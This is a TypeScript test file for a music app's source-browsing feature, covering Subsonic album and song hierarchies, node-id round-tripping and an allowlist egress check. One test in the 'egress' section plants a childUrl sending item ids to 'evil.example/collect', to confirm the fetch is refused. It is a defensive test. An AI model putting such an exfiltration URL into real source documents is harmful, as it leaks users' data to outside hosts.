/**
 * Walking a source's own hierarchy.
 *
 * Three stages — sections, what a section contains, what one of those contains
 * — and the thing worth testing at each is the same: whether a row is a place
 * to go or a thing to play, and whether the runtime can still tell after the
 * id has been round-tripped through a shell that restarted in between.
 */

import { describe, expect, it } from 'vitest'
import { RuleError } from '@BBeBee/protocol'
import type { HttpRequest, HttpService, SourceRecord } from '@BBeBee/protocol'
import { DocumentSource } from './source.js'
import { subsonicDoc } from './subsonic-doc.fixture.js'

const ALBUMS = {
  'subsonic-response': {
    albumList2: {
      album: [
        { id: 'a1', name: 'Homogenic', artist: 'Björk', coverArt: 'c1' },
        { id: 'a2', name: 'Vespertine', artist: 'Björk' },
      ],
    },
  },
}

const SONGS = {
  'subsonic-response': {
    album: {
      song: [
        { id: 's1', title: 'Jóga', artist: 'Björk', duration: 303 },
        { id: 's2', title: 'Bachelorette', artist: 'Björk', duration: 315 },
      ],
    },
  },
}

/** Serves a different body per path, and records what was asked for. */
function fakeHttp(bodies: Record<string, unknown>) {
  const requests: HttpRequest[] = []
  const http = (async (req: HttpRequest) => {
    requests.push(req)
    const path = new URL(req.url).pathname
    const body = bodies[path] ?? {}
    const text = JSON.stringify(body)
    return {
      status: 200,
      headers: { 'content-type': 'application/json' },
      url: req.url,
      text: async () => text,
      json: async () => JSON.parse(text) as unknown,
      bytes: async () => new TextEncoder().encode(text),
      stream: () => new ReadableStream(),
    }
  }) as unknown as HttpService
  return { http, requests }
}

const BASE = 'https://music.example.org'

function doc(over: Record<string, unknown> = {}) {
  return {
    sourceUrl: BASE,
    sourceName: 'Navidrome',
    exploreUrl: `[{"title":"Albums","url":"{{source.url}}/rest/getAlbumList2?type=newest"}]`,
    ruleExplore: {
      trackList: '$.subsonic-response.albumList2.album[*]',
      trackId: '$.id',
      title: '$.name',
      artist: '$.artist',
      kind: '=album',
      childUrl: '={{source.url}}/rest/getAlbum?id={{item.id}}',
    },
    ruleTrackList: {
      trackList: '$.subsonic-response.album.song[*]',
      trackId: '$.id',
      title: '$.title',
      artist: '$.artist',
      durationMs: '$.duration##$##000',
    },
    ruleStream: { url: '={{source.url}}/rest/stream?id={{track.id}}' },
    ...over,
  }
}

function record(document: Record<string, unknown>, id = 'src-1'): SourceRecord {
  return {
    id,
    sourceUrl: String(document.sourceUrl),
    name: String(document.sourceName),
    type: 'music',
    doc: document as never,
    docJson: JSON.stringify(document),
    docHash: 'h',
    enabled: true,
    sortOrder: 0,
    allowedHosts: ['music.example.org'],
    locallyModified: false,
    importedAt: 0,
    updatedAt: 0,
    failCount: 0,
  }
}

const bodies = {
  '/rest/getAlbumList2': ALBUMS,
  '/rest/getAlbum': SONGS,
}

function source(over: Record<string, unknown> = {}) {
  const { http, requests } = fakeHttp(bodies)
  return { source: new DocumentSource(record(doc(over)), { http }), requests }
}

describe('the capability', () => {
  it('is derived from the document, like every other', () => {
    expect(source().source.capabilities.browse).toBe(true)
    expect(source().source.provider().browse).toBeTypeOf('function')
  })

  it('is absent when the document describes no explore', () => {
    const bare = new DocumentSource(
      record({ sourceUrl: BASE, sourceName: 'x', ruleStream: { url: '={{source.url}}' } }),
      { http: fakeHttp({}).http },
    )
    expect(bare.capabilities.browse).toBe(false)
    expect(bare.provider().browse, 'absent, not stubbed').toBeUndefined()
  })

  it('is absent when the descent would hit an engine this build lacks', () => {
    /*
     * A document whose explore rules run but whose track listing needs `@css:`
     * is browsable *to a dead end*. Offering the button and failing one tap
     * later is worse than not offering it (docs/06 §1.3).
     */
    const { source: s } = source({
      ruleTrackList: { trackList: '@css:tr', trackId: '@css:td', title: '@css:td.t' },
    })
    expect(s.capabilities.browse).toBe(false)
  })
})

describe('the top of the tree', () => {
  it('renders exploreUrl as a section list', async () => {
    const { source: s, requests } = source()
    const root = await s.browse()

    expect(root.items.map((i) => i.title)).toEqual(['Albums'])
    expect(root.items[0]!.kind).toBe('folder')
    expect(root.items[0]!.urn, 'a section is not playable').toBeUndefined()
    expect(requests, 'the section list needs no request').toHaveLength(0)
  })

  it('treats a rendered URL as one unnamed section, and fetches it', async () => {
    // The other documented spelling: a source with a single browsable list
    // writes the URL rather than a one-element array.
    const { source: s } = source({ exploreUrl: '{{source.url}}/rest/getAlbumList2?type=newest' })
    const root = await s.browse()
    expect(root.items.map((i) => i.title)).toEqual(['Homogenic', 'Vespertine'])
  })

  it('interpolates the page number into exploreUrl', async () => {
    const { source: s, requests } = source({
      exploreUrl: '{{source.url}}/rest/getAlbumList2?offset={{page}}',
    })
    await s.browse(undefined, { cursor: '3' })
    expect(requests[0]!.url).toContain('offset=3')
  })
})

describe('descending', () => {
  it('runs ruleExplore on a section, and marks each row a node', async () => {
    const { source: s } = source()
    const root = await s.browse()
    const albums = await s.browse(root.items[0]!.id)

    expect(albums.items.map((i) => i.title)).toEqual(['Homogenic', 'Vespertine'])
    expect(albums.items[0]).toMatchObject({ kind: 'album', subtitle: 'Björk' })
    expect(albums.items[0]!.leaf, 'it has a childUrl, so it is somewhere to go').toBe(false)
  })

  it('runs ruleTrackList one level down, and marks each row a leaf', async () => {
    const { source: s } = source()
    const root = await s.browse()
    const albums = await s.browse(root.items[0]!.id)
    const songs = await s.browse(albums.items[0]!.id)

    expect(songs.items.map((i) => i.title)).toEqual(['Jóga', 'Bachelorette'])
    expect(songs.items[0]!.kind, 'no childUrl, so it is something to play').toBe('track')
    expect(songs.items[0]!.urn).toBe('BBeBee:src-1:track:s1')
    // The leaf's id is the backend's own, which is what resolveStream is handed.
    expect(songs.items[0]!.id).toBe('s1')
  })

  it('builds the child URL from the row it belongs to', async () => {
    const { source: s, requests } = source()
    const root = await s.browse()
    const albums = await s.browse(root.items[0]!.id)
    await s.browse(albums.items[1]!.id)

    expect(requests.at(-1)!.url).toContain('id=a2')
  })

  it('carries artwork through when the row has it', async () => {
    const { source: s } = source({
      ruleExplore: {
        ...doc().ruleExplore,
        artwork: '={{source.url}}/rest/getCoverArt?id={{item.coverArt}}',
      },
    })
    const albums = await s.browse((await s.browse()).items[0]!.id)
    expect(albums.items[0]!.artwork?.sourceUrl).toContain('id=c1')
  })
})

describe('node ids', () => {
  it('survives being handed back after a restart', async () => {
    /*
     * The id is self-contained rather than a key into a map the runtime keeps.
     * A shell restores its navigation stack after a relaunch, and a map would
     * not have survived it — the user would return to a folder that no longer
     * exists and be shown an error for having been away.
     */
    const first = source()
    const id = (await first.source.browse()).items[0]!.id

    const second = source()
    const albums = await second.source.browse(id)
    expect(albums.items.map((i) => i.title)).toEqual(['Homogenic', 'Vespertine'])
  })

  it('refuses one minted by a different source', async () => {
    const { source: a } = source()
    const id = (await a.browse()).items[0]!.id

    const other = new DocumentSource(record(doc(), 'src-2'), { http: fakeHttp(bodies).http })
    await expect(other.browse(id)).rejects.toThrow(/different source/)
  })

  it('says something useful when handed a leaf id', async () => {
    // The likeliest mistake a shell makes, and "invalid base64" would send
    // whoever hit it looking in entirely the wrong place.
    const { source: s } = source()
    await expect(s.browse('s1')).rejects.toThrow(/leaf id/)
  })

  it('refuses a mangled id rather than fetching something odd', async () => {
    const { source: s } = source()
    await expect(s.browse('n1.@@@@')).rejects.toThrow(RuleError)
  })
})

describe('egress', () => {
  it('refuses a childUrl pointing off the allowlist', async () => {
    // The allowlist is re-checked on every fetch, not only on the first: a
    // childUrl is a URL the *document* computed, which is exactly the channel
    // an exfiltration would use.
    const { source: s } = source({
      ruleExplore: { ...doc().ruleExplore, childUrl: '=https://evil.example/collect?d={{item.id}}' },
    })
    const albums = await s.browse((await s.browse()).items[0]!.id)
    await expect(s.browse(albums.items[0]!.id)).rejects.toThrow(/evil\.example/)
  })
})

describe('the shipped document', () => {
  it('browses, using the rules it actually ships with', async () => {
    // The fixture is the contract: a change to the rule engine that breaks a
    // real document fails here rather than in someone's library.
    const shipped = subsonicDoc()
    const { http, requests } = fakeHttp(bodies)
    const s = new DocumentSource(
      { ...record(shipped), sourceUrl: BASE, allowedHosts: ['music.example.org'] },
      { http },
    )

    expect(s.capabilities.browse).toBe(true)
    const root = await s.browse()
    expect(root.items.map((i) => i.title)).toEqual(['Recently added', 'Alphabetical'])

    const albums = await s.browse(root.items[0]!.id)
    expect(albums.items.map((i) => i.title)).toEqual(['Homogenic', 'Vespertine'])
    expect(requests[0]!.url).toContain('type=newest')

    const songs = await s.browse(albums.items[0]!.id)
    expect(songs.items.map((i) => i.urn)).toEqual([
      'BBeBee:src-1:track:s1',
      'BBeBee:src-1:track:s2',
    ])
  })
})
